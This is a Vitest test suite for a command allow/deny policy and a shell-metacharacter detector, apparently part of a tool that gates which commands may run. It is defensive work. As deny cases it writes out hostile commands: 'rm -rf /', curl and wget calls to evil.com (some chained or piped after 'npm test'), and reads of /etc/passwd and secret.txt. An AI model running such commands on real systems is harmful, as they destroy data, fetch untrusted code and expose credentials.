import { describe, it, expect } from 'vitest';
import { CommandPolicy, containsShellMetacharacters } from '../../src/quality/command-policy.js';

describe('CommandPolicy', () => {
  const policy = new CommandPolicy();

  describe('isAllowed', () => {
    it('allows safe commands', () => {
      expect(policy.isAllowed('npm test').allowed).toBe(true);
      expect(policy.isAllowed('git diff').allowed).toBe(true);
      expect(policy.isAllowed('git status').allowed).toBe(true);
      expect(policy.isAllowed('node script.js').allowed).toBe(true);
      expect(policy.isAllowed('npx vitest run').allowed).toBe(true);
    });

    it('denies dangerous commands', () => {
      expect(policy.isAllowed('git push').allowed).toBe(false);
      expect(policy.isAllowed('git push --force').allowed).toBe(false);
      expect(policy.isAllowed('rm -rf /').allowed).toBe(false);
    });

    it('denies unknown commands by default', () => {
      expect(policy.isAllowed('curl http://evil.com').allowed).toBe(false);
      expect(policy.isAllowed('wget http://evil.com/script.sh').allowed).toBe(false);
    });

    it('provides a reason for denial', () => {
      const result = policy.isAllowed('rm -rf /*');
      expect(result.allowed).toBe(false);
      expect(result.reason).toBeTruthy();
      expect(result.matchedRule).toBeDefined();
    });

    it('provides a reason for allowance', () => {
      const result = policy.isAllowed('npm test');
      expect(result.allowed).toBe(true);
      expect(result.reason).toBeTruthy();
    });
  });

  describe('shell metacharacter blocking', () => {
    it('denies command chaining with &&', () => {
      expect(policy.isAllowed('node -e "1" && rm -rf /').allowed).toBe(false);
      expect(policy.isAllowed('npm test && curl evil.com').allowed).toBe(false);
    });

    it('denies OR chaining with ||', () => {
      expect(policy.isAllowed('npm test || echo pwned').allowed).toBe(false);
    });

    it('denies piping with |', () => {
      expect(policy.isAllowed('npm test | curl evil.com').allowed).toBe(false);
      expect(policy.isAllowed('cat /etc/passwd | grep root').allowed).toBe(false);
    });

    it('denies command separator with ;', () => {
      expect(policy.isAllowed('npm test; rm -rf /').allowed).toBe(false);
    });

    it('denies output redirection with >', () => {
      expect(policy.isAllowed('npm test > /dev/null').allowed).toBe(false);
    });

    it('denies input redirection with <', () => {
      expect(policy.isAllowed('npm test < /etc/passwd').allowed).toBe(false);
    });

    it('denies command substitution with $()', () => {
      expect(policy.isAllowed('echo $(cat /etc/passwd)').allowed).toBe(false);
    });

    it('denies backtick command substitution', () => {
      expect(policy.isAllowed('echo `cat /etc/passwd`').allowed).toBe(false);
    });

    it('denies background operator &', () => {
      expect(policy.isAllowed('npm test &').allowed).toBe(false);
      expect(policy.isAllowed('cmd & echo pwned').allowed).toBe(false);
    });

    it('denies PowerShell subexpressions', () => {
      expect(policy.isAllowed('echo $(Get-Content secret.txt)').allowed).toBe(false);
    });

    it('metacharacter reason mentions shell metacharacters', () => {
      const result = policy.isAllowed('safe-cmd && evil');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('metacharacter');
    });
  });

  describe('addRule', () => {
    it('allows adding custom rules', () => {
      const customPolicy = new CommandPolicy();
      customPolicy.addRule({ pattern: 'my-tool', action: 'allow', reason: 'Custom tool' });
      expect(customPolicy.isAllowed('my-tool --help').allowed).toBe(true);
    });

    it('deny rules take priority over allow rules', () => {
      const customPolicy = new CommandPolicy();
      customPolicy.addRule({ pattern: 'git push', action: 'deny', reason: 'No pushes' });
      customPolicy.addRule({ pattern: 'git', action: 'allow', reason: 'Git is ok' });
      // deny is checked first
      expect(customPolicy.isAllowed('git push origin main').allowed).toBe(false);
      expect(customPolicy.isAllowed('git diff').allowed).toBe(true);
    });

    it('metacharacters block even custom allow rules', () => {
      const customPolicy = new CommandPolicy();
      customPolicy.addRule({ pattern: 'my-tool', action: 'allow', reason: 'Custom tool' });
      expect(customPolicy.isAllowed('my-tool && evil').allowed).toBe(false);
      expect(customPolicy.isAllowed('my-tool --help').allowed).toBe(true);
    });
  });

  describe('case insensitive matching', () => {
    it('matches commands case-insensitively', () => {
      expect(policy.isAllowed('NPM TEST').allowed).toBe(true);
      expect(policy.isAllowed('GIT PUSH').allowed).toBe(false);
    });
  });
});

describe('containsShellMetacharacters', () => {
  it('detects &&', () => expect(containsShellMetacharacters('a && b')).toBe(true));
  it('detects ||', () => expect(containsShellMetacharacters('a || b')).toBe(true));
  it('detects |', () => expect(containsShellMetacharacters('a | b')).toBe(true));
  it('detects ;', () => expect(containsShellMetacharacters('a; b')).toBe(true));
  it('detects >', () => expect(containsShellMetacharacters('a > b')).toBe(true));
  it('detects <', () => expect(containsShellMetacharacters('a < b')).toBe(true));
  it('detects $(', () => expect(containsShellMetacharacters('echo $(whoami)')).toBe(true));
  it('detects backtick', () => expect(containsShellMetacharacters('echo `whoami`')).toBe(true));
  it('detects @(', () => expect(containsShellMetacharacters('echo @(1,2)')).toBe(true));
  it('detects ${', () => expect(containsShellMetacharacters('echo ${HOME}')).toBe(true));
  it('returns false for clean commands', () => {
    expect(containsShellMetacharacters('npm test')).toBe(false);
    expect(containsShellMetacharacters('node script.js')).toBe(false);
    expect(containsShellMetacharacters('git diff')).toBe(false);
  });
});
